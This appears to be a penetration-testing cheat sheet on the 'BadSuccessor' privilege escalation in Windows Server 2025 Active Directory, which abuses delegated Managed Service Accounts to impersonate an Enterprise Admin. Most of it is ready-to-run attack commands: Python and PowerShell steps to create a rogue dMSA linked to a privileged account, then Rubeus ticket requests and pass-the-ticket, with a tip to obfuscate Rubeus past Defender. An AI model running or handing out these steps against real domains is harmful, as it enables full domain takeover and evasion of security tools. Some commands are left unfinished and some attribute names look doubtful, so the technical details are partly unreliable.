# BadSuccessor – dMSA Kerberos Impersonation (Windows Server 2025)

Delegated Managed Service Accounts (dMSA, Windows Server 2025) inherit Kerberos identity from a predecessor account. If you can create a dMSA and link it to a privileged account, you request TGS tickets as that account — including Enterprise Admins.

**Requirements**: `Create-Child` (or delegated dMSA creation right) on an OU, domain functional level ≥ Windows Server 2025.

## Detect / Enumerate

```powershell
# Verify domain is WS2025
(Get-ADDomain).DomainMode

# Check who can create dMSA objects (look for Create-Child on ms-DS-DelegatedManagedServiceAccount)
Get-ADOrganizationalUnit -Filter * | Get-ACL | ...
# Use BloodHound: "CanCreateDMSA" edge (Certipy or latest BloodHound-CE)
```

## Exploit (Impacket / Linux)

```bash
# Create rogue dMSA linked to target privileged account (e.g. Enterprise Admin "ymir")
# Tool: BadSuccessor.py or pyldap with dMSA support
python3 badsuccessor.py -dc-ip <DC-IP> -domain <DOMAIN> \
  -u <attacker-user> -p <pass> \
  -predecessor <EA-account-DN> \
  -name rogue-dmsa

# Request TGT/TGS as the dMSA (which inherits EA identity)
python3 getTGT.py -dc-ip <DC-IP> <DOMAIN>/<rogue-dmsa>$ -hashes :<NT-hash>
# or via Certipy / Rubeus on Windows
```

## Exploit (Windows / Rubeus with AV evasion)

```powershell
# Obfuscate Rubeus to evade Defender (Codecepticon)
# Create dMSA via PowerShell or Rubeus
New-ADServiceAccount -Name rogue-dmsa -DNSHostName <DOMAIN> `
  -PrincipalsAllowedToRetrieveManagedPassword <attacker-machine$> `
  -ManagedPasswordIntervalInDays 1 `
  -OtherAttributes @{'msDS-PredecessorDelegation'='<EA-account-DN>'}

# Request TGS
Rubeus.exe asktgs /service:krbtgt/<DOMAIN> /dmsa:<rogue-dmsa> /outfile:ea.ccache
# Import and use
Rubeus.exe ptt /ticket:<base64>
```

The dMSA inherits the predecessor's SID history, so the resulting TGS contains Enterprise Admin SIDs and grants full domain access.
